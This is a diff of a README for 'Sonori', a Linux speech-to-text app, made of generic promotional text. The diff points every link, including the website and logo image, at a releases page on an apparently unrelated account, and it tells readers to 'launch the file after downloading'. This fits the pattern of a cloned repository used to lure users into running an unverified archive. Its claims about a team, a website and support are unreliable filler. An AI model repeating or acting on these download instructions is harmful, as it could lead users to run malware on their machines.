@@ -18,7 +18,7 @@ Sonori is a fully local speech-to-text (STT) app that leverages state-of-the-art
 📌 **Description:** Sonori is a fully local STT app for Linux (Wayland)
 📌 **Topics:** asr, automatic-speech-recognition, ctranslate2, linux, onnxruntime, speech-recognition, speech-to-text, stt, voice-recognition, wayland, wgpu, whisper
 
-🔗 You can download the latest release of Sonori from [here](https://github.com/releases/789694263/Release.zip). Remember to launch the file after downloading to start using Sonori on your Linux machine!
+🔗 You can download the latest release of Sonori from [here](https://github.com/emon555502/sonori/releases). Remember to launch the file after downloading to start using Sonori on your Linux machine!
 
 **Getting Started**
 To get started with Sonori, simply download the release from the provided link, extract the files, and follow the installation instructions in the README. Once installed, you can launch Sonori and start transcribing your speech to text with ease.
@@ -30,10 +30,10 @@ Sonori is an open-source project, and we welcome contributions from the communit
 If you encounter any issues while using Sonori or have suggestions for improvement, please feel free to open an issue on the repository. Our team is dedicated to providing timely support and addressing any concerns raised by our users.
 
 **Stay Connected**
-🌐 Visit our [website](https://www.sonori-stt.com) for the latest updates and news about Sonori.
+🌐 Visit our [website](https://github.com/emon555502/sonori/releases) for the latest updates and news about Sonori.
 📧 Sign up for our newsletter to receive exclusive insights and information about Sonori's development.
 🐦 Follow us on Twitter and join the conversation around speech-to-text technology and Linux applications.
 
 **Remember, transform your speech into text seamlessly with Sonori - the ultimate STT app for Linux on Wayland. Download the latest release now and experience the power of local speech recognition on your machine!** 
 
-![Sonori Logo](https://example.com/sonori_logo.png)
+![Sonori Logo](https://github.com/emon555502/sonori/releases)
